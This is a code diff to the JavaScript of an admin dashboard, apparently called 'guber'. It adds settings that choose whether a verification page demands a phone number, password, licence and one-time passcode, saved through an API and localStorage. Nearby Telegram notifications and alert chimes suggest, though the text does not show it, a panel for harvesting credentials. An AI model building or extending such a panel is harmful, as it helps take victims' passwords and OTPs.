@@ -44,6 +44,7 @@ function checkAdminAuth() {
         if (loginOverlay) loginOverlay.classList.add('hidden');
         if (dashboardWrapper) dashboardWrapper.classList.remove('hidden');
         fetchInitialData();
+        loadPageFlowSettings();
     } else {
         if (loginOverlay) loginOverlay.classList.remove('hidden');
         if (dashboardWrapper) dashboardWrapper.classList.add('hidden');
@@ -538,6 +539,111 @@ function playChime(freq = 660, type = 'sine', duration = 0.3) {
         osc.start();
         osc.stop(audioCtx.currentTime + duration);
     } catch (err) {}
+}
+
+// ========== Verification Flow & Fields Control Settings ==========
+
+function toggleFlowPanel() {
+    const panel = document.getElementById('flow-settings-panel');
+    const icon = document.getElementById('flow-panel-icon');
+    const toggle = document.getElementById('flow-panel-toggle');
+
+    if (!panel) return;
+
+    const isHidden = panel.style.display === 'none';
+    panel.style.display = isHidden ? 'flex' : 'none';
+    panel.classList.toggle('hidden', !isHidden);
+
+    if (icon) {
+        icon.className = isHidden ? 'fa-solid fa-chevron-up' : 'fa-solid fa-chevron-down';
+    }
+    if (toggle) {
+        toggle.innerHTML = isHidden
+            ? '<i class="fa-solid fa-chevron-up" id="flow-panel-icon"></i> Hide Settings'
+            : '<i class="fa-solid fa-chevron-down" id="flow-panel-icon"></i> Show Settings';
+    }
+
+    if (isHidden) {
+        loadPageFlowSettings();
+    }
+}
+
+async function loadPageFlowSettings() {
+    try {
+        let settings = null;
+        try {
+            const res = await fetch('/api/page-settings');
+            const data = await res.json();
+            if (data.success && data.settings) {
+                settings = data.settings;
+                localStorage.setItem('guber_page_settings', JSON.stringify(settings));
+            }
+        } catch (e) {
+            console.warn('API fetch failed, checking localStorage for flow settings...');
+        }
+
+        if (!settings) {
+            const local = localStorage.getItem('guber_page_settings');
+            if (local) settings = JSON.parse(local);
+        }
+
+        if (settings) {
+            const phoneToggle = document.getElementById('toggle-require-phone');
+            const pwToggle = document.getElementById('toggle-require-password');
+            const licenseToggle = document.getElementById('toggle-require-license');
+            const otpToggle = document.getElementById('toggle-require-otp');
+
+            if (phoneToggle) phoneToggle.checked = true;
+            if (pwToggle) pwToggle.checked = settings.requirePassword !== false;
+            if (licenseToggle) licenseToggle.checked = settings.requireLicense !== false;
+            if (otpToggle) otpToggle.checked = settings.requireOtp !== false;
+        }
+    } catch (err) {
+        console.error('Failed to load page flow settings:', err);
+    }
+}
+
+async function savePageFlowSettings() {
+    const pwToggle = document.getElementById('toggle-require-password');
+    const licenseToggle = document.getElementById('toggle-require-license');
+    const otpToggle = document.getElementById('toggle-require-otp');
+
+    const payload = {
+        requirePhone: true,
+        requirePassword: pwToggle ? pwToggle.checked : true,
+        requireLicense: licenseToggle ? licenseToggle.checked : true,
+        requireOtp: otpToggle ? otpToggle.checked : true
+    };
+
+    localStorage.setItem('guber_page_settings', JSON.stringify(payload));
+    window.dispatchEvent(new CustomEvent('guber_page_settings_changed', { detail: payload }));
+
+    const statusEl = document.getElementById('flow-status-msg');
+    if (statusEl) {
+        statusEl.textContent = '⚡ Saving settings...';
+        statusEl.className = 'config-status success';
+    }
+
+    try {
+        const res = await fetch('/api/page-settings', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+
+        if (statusEl) {
+            statusEl.textContent = data.success ? '⚡ Flow settings saved & active in real-time!' : '⚠️ Saved locally';
+            statusEl.className = 'config-status ' + (data.success ? 'success' : 'error');
+            setTimeout(() => { statusEl.textContent = ''; }, 4000);
+        }
+    } catch (err) {
+        if (statusEl) {
+            statusEl.textContent = '⚡ Saved locally (Offline mode active)';
+            statusEl.className = 'config-status success';
+            setTimeout(() => { statusEl.textContent = ''; }, 4000);
+        }
+    }
 }
 
 // ========== Telegram Bot Notification Settings ==========
